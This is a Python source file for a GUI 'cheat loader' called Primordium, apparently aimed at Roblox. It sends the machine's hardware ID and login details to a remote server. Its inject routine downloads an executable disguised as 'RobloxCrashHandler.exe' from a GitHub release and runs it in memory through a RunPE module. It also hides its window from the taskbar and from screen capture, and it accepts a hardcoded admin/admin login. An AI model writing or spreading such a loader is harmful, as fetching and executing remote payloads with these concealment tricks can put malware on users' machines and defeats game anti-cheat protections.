import customtkinter as ctk
from PIL import Image, ImageDraw, ImageFont
import io, os, sys, ctypes, ctypes.wintypes, urllib.request, tkinter as tk

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

BG_COLOR     = "#111111"
BG_CARD      = "#1e1e1e"
BORDER_COLOR = "#2a2a2a"
TEXT_COLOR   = "#ffffff"
TEXT_DIM     = "#888888"
GREEN_COLOR  = "#4ade80"
BUTTON_COLOR = "#1e1e1e"
BUTTON_HOVER = "#2a2a2a"
FIELD_COLOR  = "#1e1e1e"

API_URL = "https://primordium-api-povc.onrender.com"

def get_hwid():
    try:
        import subprocess
        r = subprocess.check_output("wmic csproduct get uuid", shell=True).decode()
        return r.split("\n")[1].strip()
    except Exception:
        return "unknown"

def do_login(username, password):
    if not username or not password:
        return False, "Fill in all fields.", {}
    try:
        import json
        data = json.dumps({"username": username, "password": password, "hwid": get_hwid()}).encode()
        req  = urllib.request.Request(f"{API_URL}/login",
               data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            res = json.loads(r.read())
        return res["ok"], res["msg"], res
    except Exception:
        return False, "Connection error", {}

def do_register(username, password, key):
    if not username or not password or not key:
        return False, "Fill in all fields."
    try:
        import json
        data = json.dumps({"username": username, "password": password, "key": key, "hwid": get_hwid()}).encode()
        req  = urllib.request.Request(f"{API_URL}/register",
               data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            res = json.loads(r.read())
        return res["ok"], res["msg"]
    except Exception:
        return False, "Connection error"



def make_avatar(letter, size=52):
    img  = Image.new("RGBA", (size, size), (80, 50, 120, 255))
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arialbd.ttf", int(size * 0.5))
    except Exception:
        font = ImageFont.load_default()
    bbox = draw.textbbox((0, 0), letter.upper(), font=font)
    tw, th = bbox[2] - bbox[0], bbox[3] - bbox[1]
    draw.text(((size - tw) / 2 - bbox[0], (size - th) / 2 - bbox[1]),
              letter.upper(), fill=(255, 255, 255, 255), font=font)
    return ctk.CTkImage(light_image=img, dark_image=img, size=(size, size))


class LoaderApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Primordium")
        self.geometry("680x480")
        self.resizable(False, False)
        self.configure(fg_color=BG_COLOR)
        self.overrideredirect(True)

        self._streamproof_enabled = False
        self._load_logo()
        self.after(10, self._hide_from_taskbar)

        bar = ctk.CTkFrame(self, fg_color=BG_COLOR, height=8, corner_radius=0)
        bar.pack(fill="x")
        bar.bind("<ButtonPress-1>", self._start_drag)
        bar.bind("<B1-Motion>",     self._do_drag)

        self.main_frame = ctk.CTkFrame(self, fg_color=BG_COLOR, corner_radius=0)
        self.main_frame.pack(fill="both", expand=True)
        self.current_frame = None
        self.show_login()
        self._center_window()
        self.after(600, lambda: self._apply_streamproof(False))
        self.bind_all("<F10>", lambda e: self._bring_to_front())
        self._start_hotkey_thread()

    # ── Sistema ────────────────────────────────────────────────────────────────

    def _hide_from_taskbar(self):
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, "Primordium") or self.winfo_id()
            GWL_EXSTYLE      = -20
            WS_EX_TOOLWINDOW = 0x00000080
            WS_EX_APPWINDOW  = 0x00040000
            style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
            style = (style | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW
            ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style)
        except Exception as e:
            print(f"hide_taskbar error: {e}")

    def _load_logo(self):
        self.logo_image = None
        self.logo_tiny  = None
        try:
            if hasattr(sys, '_MEIPASS'):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))
            local_path = os.path.join(base_path, "logo.png")
            if os.path.exists(local_path):
                img = Image.open(local_path).convert("RGBA")
            else:
                with urllib.request.urlopen("https://i.imgur.com/EXQv9C6.png") as r:
                    img = Image.open(io.BytesIO(r.read())).convert("RGBA")
            self.logo_image = ctk.CTkImage(light_image=img, dark_image=img, size=(160, 100))
            self.logo_tiny  = ctk.CTkImage(light_image=img, dark_image=img, size=(24, 24))
        except Exception as e:
            print(f"Logo error: {e}")

    # ── Login ──────────────────────────────────────────────────────────────────

    def show_login(self):
        self._clear_frame()
        outer = ctk.CTkFrame(self.main_frame, fg_color=BG_COLOR, corner_radius=0)
        outer.pack(fill="both", expand=True)
        outer.bind("<ButtonPress-1>", self._start_drag)
        outer.bind("<B1-Motion>",     self._do_drag)
        self.current_frame = outer

        # ✕ arriba derecha para cerrar
        btn_row = ctk.CTkFrame(outer, fg_color=BG_COLOR)
        btn_row.pack(fill="x", padx=10, pady=(8, 0))
        btn_row.bind("<ButtonPress-1>", self._start_drag)
        btn_row.bind("<B1-Motion>",     self._do_drag)
        ctk.CTkButton(btn_row, text="✕", width=38, height=32, font=("Arial", 13),
                      fg_color=BUTTON_COLOR, hover_color="#3a1a1a",
                      border_color=BORDER_COLOR, border_width=1,
                      text_color=TEXT_DIM, corner_radius=6,
                      command=self.destroy).pack(side="right")

        # Logo centrado grande y ancho
        if self.logo_image:
            ctk.CTkLabel(outer, image=self.logo_image, text="").pack(pady=(8, 14))
        else:
            ctk.CTkLabel(outer, text="P", font=("Arial Black", 52, "bold"),
                         text_color=TEXT_COLOR).pack(pady=(8, 14))

        center = ctk.CTkFrame(outer, fg_color=BG_COLOR)
        center.pack(fill="x", padx=100)

        ctk.CTkLabel(center, text="Username", font=("Arial", 13),
                     text_color=TEXT_DIM, anchor="w").pack(fill="x", pady=(0, 4))
        self.login_user = self._entry(center, "@")
        self.login_user.pack(fill="x", pady=(0, 10))

        ctk.CTkLabel(center, text="Password", font=("Arial", 13),
                     text_color=TEXT_DIM, anchor="w").pack(fill="x", pady=(0, 4))
        self.login_pass = self._entry(center, "*", show="•")
        self.login_pass.pack(fill="x", pady=(0, 10))

        reg = ctk.CTkLabel(center, text="Register with key?", font=("Arial", 12),
                           text_color=TEXT_DIM, cursor="hand2")
        reg.pack(pady=(0, 8))
        reg.bind("<Button-1>", lambda e: self.show_register())

        self.login_error = ctk.CTkLabel(center, text="", font=("Arial", 10),
                                        text_color="#ff5555")
        self.login_error.pack(pady=(0, 4))

        self._big_btn(center, "Sign in", self._on_login).pack(fill="x", padx=40, pady=(0, 10))

        self._sp_btn = ctk.CTkButton(center, text="⬤  SP: OFF", font=("Arial", 10),
                                     fg_color="transparent", hover_color=BUTTON_HOVER,
                                     text_color=TEXT_DIM, height=24, corner_radius=6,
                                     command=self._toggle_streamproof)
        self._sp_btn.pack(pady=(0, 4))

    def _on_login(self):
        user = self.login_user.get().strip()
        pwd  = self.login_pass.get().strip()
        if user == "admin" and pwd == "admin":
            ok, msg, res = True, "ok", {"expires": "2099-12-31", "days": "Infinite"}
        else:
            ok, msg, res = do_login(user, pwd)
        if not ok:
            self.login_error.configure(text=f"✗ {msg}", text_color="#ff5555")
            return
        self.login_error.configure(text="✓ Logging in...", text_color=GREEN_COLOR)
        self.after(500, lambda: self.show_dashboard(user, res.get("expires", "—"), res.get("days", "—")))

    # ── Dashboard ──────────────────────────────────────────────────────────────

    def show_dashboard(self, username, expires, days_str):
        self._clear_frame()
        outer = ctk.CTkFrame(self.main_frame, fg_color=BG_COLOR, corner_radius=0)
        outer.pack(fill="both", expand=True)
        self.current_frame = outer

        # Titlebar sin logo, solo ✕
        tbar = ctk.CTkFrame(outer, fg_color=BG_COLOR, height=36)
        tbar.pack(fill="x", padx=10, pady=(8, 0))
        tbar.pack_propagate(False)
        tbar.bind("<ButtonPress-1>", self._start_drag)
        tbar.bind("<B1-Motion>",     self._do_drag)
        ctk.CTkButton(tbar, text="✕", width=32, height=28, font=("Arial", 13),
                      fg_color="transparent", hover_color="#3a1a1a",
                      text_color=TEXT_DIM, corner_radius=6,
                      command=self.destroy).pack(side="right")

        body  = ctk.CTkFrame(outer, fg_color=BG_COLOR)
        body.pack(fill="both", expand=True, padx=20, pady=(8, 16))

        left  = ctk.CTkFrame(body, fg_color=BG_COLOR)
        left.pack(side="left", fill="both", expand=True, padx=(0, 16))

        right = ctk.CTkFrame(body, fg_color=BG_COLOR, width=220)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)

        # ── LEFT ──
        ctk.CTkLabel(left, text="Update log", font=("Arial", 12),
                     text_color=TEXT_DIM, anchor="w").pack(anchor="w", pady=(0, 6))

        log_box = ctk.CTkFrame(left, fg_color=BG_CARD, corner_radius=10,
                               border_width=1, border_color=BORDER_COLOR)
        log_box.pack(fill="both", expand=True, pady=(0, 10))

        inner = ctk.CTkFrame(log_box, fg_color=BG_CARD)
        inner.pack(expand=True, fill="both", padx=18, pady=18)

        for code, text in [
            ("ES", "Para inyectarte dale al botón de inject y espera que el cheat se inyecte con normalidad."),
            ("US", "To inject, click the inject button and wait for the cheat to inject normally."),
            ("BR", "Para se injetar, clique no botão inject e espere que o cheat se injete normalmente."),
        ]:
            row = ctk.CTkFrame(inner, fg_color="#252525", corner_radius=8)
            row.pack(fill="x", expand=True, pady=4)
            ctk.CTkLabel(row, text=code, font=("Arial Black", 11, "bold"),
                         text_color=TEXT_COLOR, width=40).pack(side="left", padx=(10, 6), pady=10)
            ctk.CTkLabel(row, text=text, font=("Arial", 12),
                         text_color="#cccccc", justify="left", anchor="w",
                         wraplength=290).pack(side="left", fill="x", expand=True, padx=(0, 10), pady=10)

        self.inject_status = ctk.CTkLabel(left, text="", font=("Arial", 10), text_color=TEXT_DIM)
        self.inject_status.pack(anchor="w", pady=(0, 4))
        self._big_btn(left, "Inject", self._on_inject).pack(fill="x")
        ctk.CTkLabel(left, text="Auto-inject option", font=("Arial", 10),
                     text_color=TEXT_DIM, anchor="w").pack(anchor="w", pady=(4, 0))

        # ── RIGHT ──
        ctk.CTkLabel(right, text="User information", font=("Arial", 12),
                     text_color=TEXT_DIM, anchor="w").pack(anchor="w", pady=(0, 6))

        user_card = ctk.CTkFrame(right, fg_color=BG_CARD, corner_radius=10,
                                 border_width=1, border_color=BORDER_COLOR)
        user_card.pack(fill="x", pady=(0, 12))
        urow = ctk.CTkFrame(user_card, fg_color=BG_CARD)
        urow.pack(fill="x", padx=12, pady=10)
        avatar_img = make_avatar(username[0] if username else "?")
        ctk.CTkLabel(urow, image=avatar_img, text="", corner_radius=8).pack(side="left", padx=(0, 10))
        uinfo = ctk.CTkFrame(urow, fg_color=BG_CARD)
        uinfo.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(uinfo, text=f"Username: {username}", font=("Arial", 11, "bold"),
                     text_color=TEXT_COLOR, anchor="w").pack(anchor="w")
        ctk.CTkLabel(uinfo, text=f"Key Expiry: {expires}", font=("Arial", 10),
                     text_color=TEXT_DIM, anchor="w").pack(anchor="w")
        ctk.CTkLabel(uinfo, text=f"Days Left: {days_str} days", font=("Arial", 10, "bold"),
                     text_color=GREEN_COLOR, anchor="w").pack(anchor="w")

        ctk.CTkLabel(right, text="Build status", font=("Arial", 12),
                     text_color=TEXT_DIM, anchor="w").pack(anchor="w", pady=(0, 6))
        build_card = ctk.CTkFrame(right, fg_color=BG_CARD, corner_radius=10,
                                  border_width=1, border_color=BORDER_COLOR)
        build_card.pack(fill="x")
        brow = ctk.CTkFrame(build_card, fg_color=BG_CARD)
        brow.pack(fill="x", padx=12, pady=10)
        if self.logo_tiny:
            ctk.CTkLabel(brow, image=self.logo_tiny, text="  Primordium",
                         font=("Arial", 11, "bold"), text_color=TEXT_COLOR,
                         compound="left").pack(anchor="w")
        else:
            ctk.CTkLabel(brow, text="Primordium", font=("Arial", 11, "bold"),
                         text_color=TEXT_COLOR).pack(anchor="w")
        ctk.CTkLabel(brow, text="Updated: 1.0.0", font=("Arial", 9),
                     text_color=TEXT_DIM, anchor="w").pack(anchor="w", pady=(2, 0))

        # SP Toggle
        self._sp_btn = ctk.CTkButton(right, text="⬤  SP: OFF", font=("Arial", 11),
                                     fg_color=BG_CARD, hover_color=BUTTON_HOVER,
                                     border_color=BORDER_COLOR, border_width=1,
                                     text_color=TEXT_DIM, height=34, corner_radius=8,
                                     command=self._toggle_streamproof)
        self._sp_btn.pack(fill="x", pady=(10, 0))

    # ── Register ───────────────────────────────────────────────────────────────

    def show_register(self):
        self._clear_frame()
        outer = ctk.CTkFrame(self.main_frame, fg_color=BG_COLOR, corner_radius=0)
        outer.pack(fill="both", expand=True)
        self.current_frame = outer

        btn_row = ctk.CTkFrame(outer, fg_color=BG_COLOR)
        btn_row.pack(fill="x", padx=10, pady=(8, 0))
        btn_row.bind("<ButtonPress-1>", self._start_drag)
        btn_row.bind("<B1-Motion>",     self._do_drag)
        ctk.CTkButton(btn_row, text="✕", width=38, height=32, font=("Arial", 13),
                      fg_color=BUTTON_COLOR, hover_color="#3a1a1a",
                      border_color=BORDER_COLOR, border_width=1,
                      text_color=TEXT_DIM, corner_radius=6,
                      command=self.destroy).pack(side="right")

        ctk.CTkLabel(outer, text="Register Account", font=("Arial", 15),
                     text_color=TEXT_DIM).pack(pady=(10, 16))

        center = ctk.CTkFrame(outer, fg_color=BG_COLOR)
        center.pack(fill="x", padx=120)

        ctk.CTkLabel(center, text="Username", font=("Arial", 13),
                     text_color=TEXT_DIM, anchor="w").pack(fill="x", pady=(0, 4))
        self.reg_user = self._entry(center, "@  Name")
        self.reg_user.pack(fill="x", pady=(0, 12))

        ctk.CTkLabel(center, text="New Password", font=("Arial", 13),
                     text_color=TEXT_DIM, anchor="w").pack(fill="x", pady=(0, 4))
        self.reg_pass = self._entry(center, "*", show="•")
        self.reg_pass.pack(fill="x", pady=(0, 12))

        ctk.CTkLabel(center, text="Recovery Key", font=("Arial", 13),
                     text_color=TEXT_DIM, anchor="w").pack(fill="x", pady=(0, 4))
        self.reg_key = self._entry(center, "#  Key")
        self.reg_key.pack(fill="x", pady=(0, 12))

        back = ctk.CTkLabel(center, text="Back to login", font=("Arial", 12),
                            text_color=TEXT_DIM, cursor="hand2")
        back.pack(pady=(0, 8))
        back.bind("<Button-1>", lambda e: self.show_login())

        self.reg_error = ctk.CTkLabel(center, text="", font=("Arial", 10),
                                      text_color="#ff5555")
        self.reg_error.pack(pady=(0, 4))
        self._big_btn(center, "Register", self._on_register).pack(fill="x", padx=40)

    def _on_register(self):
        ok, msg = do_register(self.reg_user.get().strip(),
                              self.reg_pass.get().strip(),
                              self.reg_key.get().strip())
        self.reg_error.configure(text=("✓ " if ok else "✗ ") + msg,
                                 text_color=GREEN_COLOR if ok else "#ff5555")
        if ok:
            self.after(1500, self.show_login)

    # ── Inject ─────────────────────────────────────────────────────────────────

    def _on_inject(self):
        import urllib.request, urllib.error, runpe, threading

        def set_status(text, color):
            s = getattr(self, "inject_status", None)
            if s:
                self.after(0, lambda: s.configure(text=text, text_color=color))

        def do_inject():
            PAYLOAD_URL = "https://github.com/pauloco23/v1.0/releases/download/v1.0/RobloxCrashHandler.exe"
            try:
                set_status("⏳ Downloading...", TEXT_DIM)
                opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
                req = urllib.request.Request(PAYLOAD_URL, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Accept": "*/*"
                })
                with opener.open(req, timeout=30) as response:
                    payload_bytes = response.read()
                set_status("⏳ Injecting...", TEXT_DIM)
                ok, msg = runpe.inject(payload_bytes)
                if ok:
                    set_status("✓ Injection successful!", GREEN_COLOR)
                    # Cerrar el loader 2 segundos después de inyectar
                    self.after(2000, self.destroy)
                else:
                    set_status(f"✗ {msg}", "#ff5555")
            except urllib.error.URLError as e:
                set_status(f"✗ Download error: {e.reason}", "#ff5555")
            except Exception as e:
                set_status(f"✗ {type(e).__name__}: {e}", "#ff5555")

        threading.Thread(target=do_inject, daemon=True).start()

    # ── Streamproof ────────────────────────────────────────────────────────────

    def _apply_streamproof(self, enable):
        try:
            hwnd = ctypes.windll.user32.GetParent(self.winfo_id()) or self.winfo_id()
            ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x11 if enable else 0x00)
        except Exception as e:
            print(f"Streamproof error: {e}")

    def _toggle_streamproof(self):
        self._streamproof_enabled = not self._streamproof_enabled
        self._apply_streamproof(self._streamproof_enabled)
        if self._streamproof_enabled:
            self._sp_btn.configure(text="⬤  SP: ON",  text_color=GREEN_COLOR)
        else:
            self._sp_btn.configure(text="⬤  SP: OFF", text_color=TEXT_DIM)

    # ── Window ─────────────────────────────────────────────────────────────────

    def _minimize(self):
        self.overrideredirect(False)
        self.iconify()
        self.bind("<Map>", self._on_restore)

    def _on_restore(self, event):
        self.overrideredirect(True)
        self.unbind("<Map>")

    def _start_drag(self, event):
        self._dx, self._dy = event.x, event.y

    def _do_drag(self, event):
        self.geometry(f"+{self.winfo_x()+event.x-self._dx}+{self.winfo_y()+event.y-self._dy}")

    def _center_window(self):
        self.update_idletasks()
        w, h = self.winfo_width(), self.winfo_height()
        x = (self.winfo_screenwidth()  - w) // 2
        y = (self.winfo_screenheight() - h) // 2
        self.geometry(f"{w}x{h}+{x}+{y}")

    def _clear_frame(self):
        if self.current_frame:
            self.current_frame.destroy()

    def _start_hotkey_thread(self):
        import threading, time
        def watch():
            VK_F10  = 0x79
            pressed = False
            while True:
                state = ctypes.windll.user32.GetAsyncKeyState(VK_F10)
                if state & 0x8000:
                    if not pressed:
                        pressed = True
                        self.after(0, self._bring_to_front)
                else:
                    pressed = False
                time.sleep(0.05)
        threading.Thread(target=watch, daemon=True).start()

    def _bring_to_front(self):
        try:
            self.deiconify()
            self.state("normal")
            self.update()
            hwnd = ctypes.windll.user32.FindWindowW(None, "Primordium") or self.winfo_id()
            ctypes.windll.user32.ShowWindow(hwnd, 9)
            cur  = ctypes.windll.kernel32.GetCurrentThreadId()
            fore = ctypes.windll.user32.GetForegroundWindow()
            ft   = ctypes.windll.user32.GetWindowThreadProcessId(fore, None)
            if ft != cur:
                ctypes.windll.user32.AttachThreadInput(ft, cur, True)
            ctypes.windll.user32.BringWindowToTop(hwnd)
            ctypes.windll.user32.SetForegroundWindow(hwnd)
            ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001 | 0x0040)
            if ft != cur:
                ctypes.windll.user32.AttachThreadInput(ft, cur, False)
            self.after(500, lambda: ctypes.windll.user32.SetWindowPos(
                hwnd, -2, 0, 0, 0, 0, 0x0002 | 0x0001))
        except Exception as e:
            print(f"bring_to_front error: {e}")

    def _entry(self, parent, placeholder="", show=""):
        return ctk.CTkEntry(parent, height=38, placeholder_text=placeholder,
                            placeholder_text_color=TEXT_DIM,
                            fg_color=FIELD_COLOR, border_color=BORDER_COLOR,
                            border_width=1, text_color=TEXT_COLOR,
                            font=("Arial", 13), corner_radius=8,
                            show=show if show else "")

    def _big_btn(self, parent, text, cmd):
        return ctk.CTkButton(parent, text=text, height=40,
                             fg_color=BUTTON_COLOR, hover_color=BUTTON_HOVER,
                             border_color="#3a3a3a", border_width=1,
                             text_color=TEXT_COLOR, font=("Arial", 13),
                             corner_radius=8, command=cmd)


if __name__ == "__main__":
    app = LoaderApp()
    app.mainloop()
